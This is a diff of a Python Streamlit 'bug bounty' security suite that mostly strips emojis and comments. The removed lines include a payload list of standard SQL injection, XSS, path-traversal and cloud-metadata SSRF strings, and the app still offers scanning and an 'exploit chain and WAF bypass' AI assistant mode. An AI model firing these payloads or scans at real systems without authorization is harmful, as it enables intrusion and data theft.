@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
-#!/usr/bin/env python3
-"""
-🛡️ MHZALY BUG BOUNTY & ENTERPRISE SECURITY PLATFORM v7.0 - FULL SCALE PRODUCTION
+MHZALY BUG BOUNTY & ENTERPRISE SECURITY PLATFORM v7.1 - FULL SCALE PRODUCTION
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Comprehensive Offensive Security, Bug Bounty Recon & Blue Team SOC Suite
 - Real-Time Target Fingerprinting & Sensitive Endpoint Fuzzing
@@ -207,7 +206,6 @@ class ThreatIntelService:
         is_ip = bool(re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', indicator))
         is_url = indicator.startswith(('http://', 'https://'))
 
-        # VirusTotal Check
         if self.vt_key:
             try:
                 headers = {'x-apikey': self.vt_key}
@@ -227,7 +225,6 @@ class ThreatIntelService:
         else:
             results['virustotal'] = {'error': 'VirusTotal API key is not configured in secrets.'}
 
-        # AbuseIPDB Check (IP validation applied to prevent JSON object errors)
         if self.abuse_key:
             if is_ip:
                 try:
@@ -241,7 +238,7 @@ class ThreatIntelService:
                 except Exception as e:
                     results['abuseipdb'] = {'error': str(e)}
             else:
-                results['abuseipdb'] = {'info': 'Skipped AbuseIPDB query because input is a Domain or URL (AbuseIPDB only supports IPv4/IPv6 addresses).'}
+                results['abuseipdb'] = {'info': 'Skipped AbuseIPDB query because input is a Domain or URL.'}
         else:
             results['abuseipdb'] = {'error': 'AbuseIPDB API key is not configured in secrets.'}
 
@@ -316,35 +313,6 @@ class AdvancedReconEngine:
 
         return report
 
-class PayloadRepository:
-    """Offensive Payload & Fuzzing Vector Repository"""
-    @staticmethod
-    def get_payloads(vector: str) -> List[str]:
-        repository = {
-            'SQL Injection (SQLi)': [
-                "' OR '1'='1", "' OR '1'='1' --", "admin' --", 
-                "1 UNION SELECT null, null, null, null--",
-                "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--",
-                "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
-            ],
-            'Cross-Site Scripting (XSS)': [
-                "<script>alert(document.domain)</script>",
-                "\"><script>alert(document.cookie)</script>",
-                "<img src=x onerror=alert(1)>",
-                "<svg/onload=alert(1)>",
-                "javascript:alert(1)//"
-            ],
-            'Local File Inclusion (LFI)': [
-                "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
-                "../../../../windows/win.ini", "php://filter/convert.base64-encode/resource=index.php"
-            ],
-            'Server-Side Request Forgery (SSRF)': [
-                "http://127.0.0.1:80", "http://localhost:8080",
-                "http://169.254.169.254/latest/meta-data/", "http://0.0.0.0:22"
-            ]
-        }
-        return repository.get(vector, ["No payloads defined."])
-
 class SecurityDatabase:
     """SQLite Persistence Database for Activity Logging"""
     def __init__(self, db_path: str = "security_platform.db"):
@@ -398,7 +366,7 @@ class SecurityDatabase:
 def main():
     st.set_page_config(
         page_title="MHZALY Enterprise Bug Bounty Suite",
-        page_icon="🛡️",
+        page_icon="🎯",
         layout="wide",
         initial_sidebar_state="expanded"
     )
@@ -410,7 +378,7 @@ def main():
         col1, col2, col3 = st.columns([1, 1.2, 1])
         with col2:
             st.markdown("<br><br>", unsafe_allow_html=True)
-            st.markdown("# 🛡️ MHZALY Enterprise Login")
+            st.markdown("# MHZALY Enterprise Login")
             st.markdown("##### Bug Bounty & Security Operations Suite")
             
             username = st.text_input("Operator Username")
@@ -428,7 +396,6 @@ def main():
                     st.error("Authentication failed: Invalid credentials.")
         return
 
-    # Load API Keys & Database
     vt_key = st.secrets.get("VIRUSTOTAL_API_KEY", "")
     abuse_key = st.secrets.get("ABUSEIPDB_API_KEY", "")
     groq_key = st.secrets.get("GROQ_API_KEY", "")
@@ -437,20 +404,20 @@ def main():
     db = SecurityDatabase()
 
     with st.sidebar:
-        st.markdown(f"### 👤 Operator: `{st.session_state.user}`")
+        st.markdown(f"### Operator: `{st.session_state.user}`")
         st.markdown("---")
         module = st.radio(
             "Navigation Menu",
             [
-                "📊 Command Telemetry Center",
-                "🎯 Bug Bounty Recon & Fuzzing",
-                "🔴 Network Infrastructure Audit",
-                "🔍 Enterprise NVD Intelligence",
-                "🟠 Threat Intel & IOC Triage",
-                "🤖 Groq AI Cyber & Exploit Assistant",
-                "🛠️ Offensive Encoder & Hasher",
-                "📊 Activity History & Logs",
-                "⚙️ Platform Configuration"
+                "Command Telemetry Center",
+                "Bug Bounty Recon & Fuzzing",
+                "Network Infrastructure Audit",
+                "Enterprise NVD Intelligence",
+                "Threat Intel & IOC Triage",
+                "Groq AI Cyber & Exploit Assistant",
+                "Offensive Encoder & Hasher",
+                "Activity History & Logs",
+                "Platform Configuration"
             ]
         )
         st.markdown("---")
@@ -458,8 +425,8 @@ def main():
             st.session_state.authenticated = False
             st.rerun()
 
-    if module == "📊 Command Telemetry Center":
-        st.markdown("# 📊 Security Operations Center - Command Dashboard")
+    if module == "Command Telemetry Center":
+        st.markdown("# Security Operations Center - Command Dashboard")
         st.markdown("Aggregated telemetry across offensive recon nodes and defensive monitoring.")
         
         c1, c2, c3, c4 = st.columns(4)
@@ -467,22 +434,9 @@ def main():
         c2.metric("NVD API Key", "Accelerated" if nvd_key else "Standard", "NIST v2.0")
         c3.metric("Groq AI", "Active" if groq_key else "Missing", "Mixtral 8x7b")
         c4.metric("SQLite DB", "Connected", "Active")
-        
-        st.markdown("---")
-        st.subheader("Platform Capabilities Overview")
-        st.markdown("""
-        * **Target Recon & Fuzzing:** Automated technology stack fingerprinting and sensitive backup file discovery.
-        * **Infrastructure Audit:** Deep DNS harvesting, port socket scanning, SSL checks, and HTTP headers security analysis.
-        * **Enterprise NVD Research:** NIST CVE database integration with accelerated API key rate limits.
-        * **Threat Intelligence Triage:** Live VirusTotal and AbuseIPDB indicator correlation with domain/IP safety.
-        * **AI Cyber Assistant:** Multi-mode assistant for general consulting, WAF bypass, code reviews, and SOC playbooks.
-        * **Offensive Encoder:** Built-in Base64, URL encoding, and cryptographic hashing tools.
-        """)
 
-    elif module == "🎯 Bug Bounty Recon & Fuzzing":
-        st.markdown("# 🎯 Target Reconnaissance & Sensitive Endpoint Fuzzing")
-        st.markdown("Profile web application assets, fingerprint frameworks, and uncover exposed configuration files.")
-        
+    elif module == "Bug Bounty Recon & Fuzzing":
+        st.markdown("# Target Reconnaissance & Sensitive Endpoint Fuzzing")
         target_input = st.text_input("Target URL or Domain", placeholder="e.g., target-domain.com")
         
         if st.button("Launch Recon & Asset Discovery", type="primary", use_container_width=True):
@@ -497,30 +451,28 @@ def main():
                     c2.metric("Web Server Banner", recon.get('server', 'N/A'))
                     c3.metric("Exposed Endpoints", len(recon.get('exposed_files', [])))
                     
-                    st.markdown("### 🌐 Authoritative DNS Records")
+                    st.markdown("### Authoritative DNS Records")
                     for rtype, recs in recon.get('dns', {}).items():
                         if recs:
                             st.markdown(f"**{rtype} Records:**")
                             for r in recs:
                                 st.code(r)
                                 
-                    st.markdown("### 💻 Fingerprinted Technology Stack")
+                    st.markdown("### Fingerprinted Technology Stack")
                     techs = recon.get('technologies', [])
                     if techs:
                         for t in techs:
-                            st.markdown(f"- 🟢 `{t}`")
+                            st.markdown(f"- `{t}`")
                     else:
                         st.info("No prominent framework signatures found.")
                         
-                    st.markdown("### 📁 Exposed Sensitive Endpoints & Backup Files")
+                    st.markdown("### Exposed Sensitive Endpoints & Backup Files")
                     exposed = recon.get('exposed_files', [])
                     if exposed:
                         st.dataframe(pd.DataFrame(exposed), use_container_width=True)
-                        
-                        # Export Option
                         json_report = json.dumps(recon, indent=2)
                         st.download_button(
-                            "📥 Export Recon Report (JSON)",
+                            "Export Recon Report (JSON)",
                             data=json_report,
                             file_name=f"recon_{target_input.replace('/', '_')}.json",
                             mime="application/json"
@@ -530,8 +482,8 @@ def main():
             else:
                 st.warning("Please specify a target domain or URL.")
 
-    elif module == "🔴 Network Infrastructure Audit":
-        st.markdown("# 🔴 Red/Blue Team Infrastructure Reconnaissance & Audit")
+    elif module == "Network Infrastructure Audit":
+        st.markdown("# Red/Blue Team Infrastructure Reconnaissance & Audit")
         target_domain = st.text_input("Target Domain or IP Address", placeholder="e.g., scanme.nmap.org")
         
         if st.button("Execute Full Infrastructure Audit", type="primary", use_container_width=True):
@@ -541,7 +493,7 @@ def main():
                     db.log_activity("Infrastructure Audit", target_domain, "Completed")
                     st.success("Infrastructure Audit Completed Successfully.")
 
-                    tab1, tab2, tab3, tab4 = st.tabs(["🌐 DNS Records", "🔌 Port Scan", "🔒 SSL / TLS", "🛡️ Security Headers"])
+                    tab1, tab2, tab3, tab4 = st.tabs(["DNS Records", "Port Scan", "SSL / TLS", "Security Headers"])
                     
                     with tab1:
                         for rtype, recs in audit_data['dns'].items():
@@ -573,10 +525,8 @@ def main():
             else:
                 st.warning("Please provide a valid target host.")
 
-    elif module == "🔍 Enterprise NVD Intelligence":
-        st.markdown("# 🔍 Enterprise NVD Vulnerability Intelligence")
-        st.markdown("Search official NIST CVE repositories accelerated by your NVD API Key.")
-        
+    elif module == "Enterprise NVD Intelligence":
+        st.markdown("# Enterprise NVD Vulnerability Intelligence")
         keyword = st.text_input("Search Software / Vendor / CVE", placeholder="e.g., apache, wordpress plugin, cve-2024")
         
         if st.button("Query NVD Database", type="primary", use_container_width=True):
@@ -589,7 +539,7 @@ def main():
                     if vulns:
                         st.success(f"Retrieved {len(vulns)} CVE records.")
                         for v in vulns:
-                            with st.expander(f"📌 {v.cve_id} | Severity: {v.severity} | CVSS: {v.cvss_score}"):
+                            with st.expander(f"{v.cve_id} | Severity: {v.severity} | CVSS: {v.cvss_score}"):
                                 st.markdown(f"**Published:** {v.published_date}")
                                 st.markdown(f"**Vector:** `{v.vector_string}`")
                                 st.write(v.description)
@@ -599,8 +549,8 @@ def main():
             else:
                 st.warning("Please enter a search keyword.")
 
-    elif module == "🟠 Threat Intel & IOC Triage":
-        st.markdown("# 🟠 Live Threat Intelligence & IOC Triage")
+    elif module == "Threat Intel & IOC Triage":
+        st.markdown("# Live Threat Intelligence & IOC Triage")
         indicator = st.text_input("Enter Indicator (IP Address, Domain, or URL)", placeholder="e.g., 8.8.8.8 or example.com")
         
         if st.button("Run Threat Triage", type="primary", use_container_width=True):
@@ -623,24 +573,22 @@ def main():
                         if abuse_key:
                             st.json(report['abuseipdb'])
                         else:
-                            st.info("AbuseIPDB API Key not configured or skipped for non-IP input.")
+                            st.info("AbuseIPDB API Key not configured or skipped.")
             else:
                 st.warning("Please provide an indicator.")
 
-    elif module == "🤖 Groq AI Cyber & Exploit Assistant":
-        st.markdown("# 🤖 Groq AI Cyber Security & Exploit Assistant")
-        st.markdown("Ask general cybersecurity questions, request exploit vectors, or build WAF bypass chains.")
-        
+    elif module == "Groq AI Cyber & Exploit Assistant":
+        st.markdown("# Groq AI Cyber Security & Exploit Assistant")
         if not groq_key:
             st.error("Groq API Key is missing in secrets.")
         else:
             mode = st.selectbox(
                 "Select AI Assistant Mode",
                 [
-                    "🌐 General Cybersecurity Consulting & Questions",
-                    "🎯 Exploit Chain & WAF Bypass Strategy",
-                    "🔍 Vulnerability Code Review & Patching",
-                    "🚨 SOC Incident Response Playbook"
+                    "General Cybersecurity Consulting & Questions",
+                    "Exploit Chain & WAF Bypass Strategy",
+                    "Vulnerability Code Review & Patching",
+                    "SOC Incident Response Playbook"
                 ]
             )
             
@@ -680,11 +628,9 @@ def main():
                 else:
                     st.warning("Please enter a query or prompt.")
 
-    elif module == "🛠️ Offensive Encoder & Hasher":
-        st.markdown("# 🛠️ Offensive Payload Encoder, Decoder & Hasher")
-        st.markdown("Quickly encode payloads or hash strings during bug bounty engagements.")
-        
-        input_text = st.text_area("Input String / Payload", placeholder="Enter text to encode, decode, or hash...")
+    elif module == "Offensive Encoder & Hasher":
+        st.markdown("# Offensive Payload Encoder, Decoder & Hasher")
+        input_text = st.text_input("Input String / Payload", placeholder="Enter text to encode, decode, or hash...")
         
         col_enc1, col_enc2 = st.columns(2)
         with col_enc1:
@@ -711,21 +657,21 @@ def main():
                     st.markdown(f"**MD5:** `{md5_h}`")
                     st.markdown(f"**SHA256:** `{sha_h}`")
 
-    elif module == "📊 Activity History & Logs":
-        st.markdown("# 📊 Activity History & SQLite Audit Logs")
+    elif module == "Activity History & Logs":
+        st.markdown("# Activity History & SQLite Audit Logs")
         history = db.get_history()
         if history:
             st.dataframe(pd.DataFrame(history), use_container_width=True)
         else:
             st.info("No recorded activity logs found.")
 
-    elif module == "⚙️ Platform Configuration":
-        st.markdown("# ⚙️ Platform Telemetry & API Status")
-        st.write(f"{'✅' if nvd_key else '⚠️'} **NVD API Key:** {'Accelerated' if nvd_key else 'Standard'}")
-        st.write(f"{'✅' if vt_key else '❌'} **VirusTotal API:** {'Active' if vt_key else 'Missing'}")
-        st.write(f"{'✅' if abuse_key else '❌'} **AbuseIPDB API:** {'Active' if abuse_key else 'Missing'}")
-        st.write(f"{'✅' if groq_key else '❌'} **Groq AI Assistant:** {'Active' if groq_key else 'Missing'}")
-        st.write("✅ **SQLite Database:** Initialized")
+    elif module == "Platform Configuration":
+        st.markdown("# Platform Telemetry & API Status")
+        st.write(f"**NVD API Key:** {'Accelerated' if nvd_key else 'Standard'}")
+        st.write(f"**VirusTotal API:** {'Active' if vt_key else 'Missing'}")
+        st.write(f"**AbuseIPDB API:** {'Active' if abuse_key else 'Missing'}")
+        st.write(f"**Groq AI Assistant:** {'Active' if groq_key else 'Missing'}")
+        st.write("**SQLite Database:** Initialized")
 
 if __name__ == "__main__":
     main()
